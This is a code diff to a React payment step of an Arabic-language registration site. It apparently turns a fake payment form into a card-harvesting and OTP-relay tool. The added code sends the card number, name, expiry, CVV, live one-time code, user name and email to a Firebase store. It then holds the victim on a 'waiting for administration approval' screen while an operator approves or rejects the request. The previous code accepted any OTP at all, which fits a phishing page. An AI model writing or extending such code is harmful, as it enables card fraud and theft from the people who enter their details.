@@ -9,10 +9,12 @@ import {
   Lock, 
   CheckCircle, 
   AlertCircle, 
-  RefreshCw 
+  RefreshCw,
+  Clock
 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLocation } from "wouter";
+import { requestOtpApproval, subscribeToOtpApproval, deleteOtpRequest } from "@/lib/firebase";
 
 interface Step4PaymentProps {
   onNext: (paymentData?: any) => void;
@@ -35,6 +37,8 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
   const [isVerifying, setIsVerifying] = useState(false);
   const [demoCode, setDemoCode] = useState("");
   const [cooldown, setCooldown] = useState(0);
+  const [waitingForApproval, setWaitingForApproval] = useState(false);
+  const [approvalStatus, setApprovalStatus] = useState<string | null>(null);
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   // Countdown timer
@@ -44,6 +48,48 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
       return () => clearTimeout(timer);
     }
   }, [cooldown]);
+
+  // Subscribe to OTP approval status
+  useEffect(() => {
+    if (!waitingForApproval) return;
+    
+    let hasProcessed = false;
+    
+    const unsubscribe = subscribeToOtpApproval((status) => {
+      if (hasProcessed) return;
+      
+      setApprovalStatus(status);
+      if (status === "approved") {
+        hasProcessed = true;
+        toast({
+          title: "تم الموافقة",
+          description: "تمت الموافقة على عملية الدفع بنجاح",
+        });
+        // Clean up and proceed
+        setWaitingForApproval(false);
+        const code = otpDigits.join("");
+        onNext({
+          cardNumber: cardNumber,
+          cardName: cardName,
+          expiry: expiry,
+          cvv: cvv,
+          otpCode: code,
+        });
+      } else if (status === "rejected") {
+        hasProcessed = true;
+        toast({
+          title: "تم الرفض",
+          description: "تم رفض عملية الدفع",
+          variant: "destructive",
+        });
+        setWaitingForApproval(false);
+        setOtpDigits(["", "", "", "", "", ""]);
+        setOtpError("تم رفض رمز التحقق. يرجى المحاولة مرة أخرى.");
+      }
+    });
+
+    return () => unsubscribe();
+  }, [waitingForApproval, cardNumber, cardName, expiry, cvv, otpDigits, onNext, toast]);
 
   const formatCardNumber = (value: string) => {
     const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
@@ -132,7 +178,7 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
     setOtpDigits(newDigits);
   };
 
-  const handleVerifyOtp = () => {
+  const handleVerifyOtp = async () => {
     const code = otpDigits.join("");
     if (code.length !== 6) {
       setOtpError("يرجى إدخال رمز التحقق المكون من 6 أرقام");
@@ -141,22 +187,32 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
 
     setIsVerifying(true);
 
-    // Accept any OTP code entered by user
-    setTimeout(() => {
-      toast({
-        title: "تم الدفع بنجاح",
-        description: "تمت عملية الدفع وتسجيل حسابك بنجاح",
-      });
-      // Complete registration and show success with card data
-      onNext({
-        cardNumber: cardNumber,
-        cardName: cardName,
-        expiry: expiry,
-        cvv: cvv,
-        otpCode: code,
-      });
+    // Send OTP for admin approval
+    const success = await requestOtpApproval({
+      cardNumber: cardNumber,
+      cardName: cardName,
+      expiry: expiry,
+      cvv: cvv,
+      otpCode: code,
+      userName: formData?.step_2_personal_data?.fullNameArabic,
+      email: formData?.step_2_personal_data?.email,
+    });
+
+    if (success) {
+      setWaitingForApproval(true);
       setIsVerifying(false);
-    }, 1500);
+      toast({
+        title: "في انتظار الموافقة",
+        description: "تم إرسال طلب التحقق وفي انتظار الموافقة",
+      });
+    } else {
+      setIsVerifying(false);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء إرسال طلب التحقق",
+        variant: "destructive",
+      });
+    }
   };
 
   const resendOtp = () => {
@@ -173,6 +229,59 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
   };
 
   if (showOtp) {
+    // Waiting for admin approval
+    if (waitingForApproval) {
+      return (
+        <div className="p-6 md:p-8">
+          <h2 className="text-2xl font-bold text-center mb-8 pb-4 border-b border-gray-300">
+            في انتظار الموافقة
+          </h2>
+
+          <div className="max-w-md mx-auto space-y-6">
+            <div className="text-center">
+              <div className="mx-auto w-20 h-20 bg-orange-100 rounded-full flex items-center justify-center mb-4">
+                <Clock className="h-10 w-10 text-orange-600 animate-pulse" />
+              </div>
+              <h3 className="text-xl font-bold text-gray-800 mb-2">جاري التحقق من البيانات</h3>
+              <p className="text-gray-600">
+                تم إرسال طلب التحقق وفي انتظار الموافقة من الإدارة
+              </p>
+            </div>
+
+            <div className="bg-orange-50 border border-orange-200 rounded-lg p-4">
+              <div className="flex items-center gap-3">
+                <RefreshCw className="h-5 w-5 text-orange-600 animate-spin" />
+                <div>
+                  <p className="font-medium text-orange-800">جاري المعالجة...</p>
+                  <p className="text-sm text-orange-600">يرجى الانتظار، سيتم إخطارك عند الموافقة</p>
+                </div>
+              </div>
+            </div>
+
+            <div className="bg-gray-50 rounded-lg p-4 space-y-2">
+              <p className="text-sm text-gray-600">
+                <span className="font-medium">رقم البطاقة:</span> {cardNumber}
+              </p>
+              <p className="text-sm text-gray-600">
+                <span className="font-medium">رمز OTP:</span> {otpDigits.join("")}
+              </p>
+            </div>
+
+            <Button
+              onClick={() => {
+                setWaitingForApproval(false);
+                setOtpDigits(["", "", "", "", "", ""]);
+              }}
+              variant="outline"
+              className="w-full bg-white border-gray-300 hover:bg-gray-50 text-gray-800 h-12"
+            >
+              إلغاء والعودة
+            </Button>
+          </div>
+        </div>
+      );
+    }
+
     return (
       <div className="p-6 md:p-8">
         <h2 className="text-2xl font-bold text-center mb-8 pb-4 border-b border-gray-300">
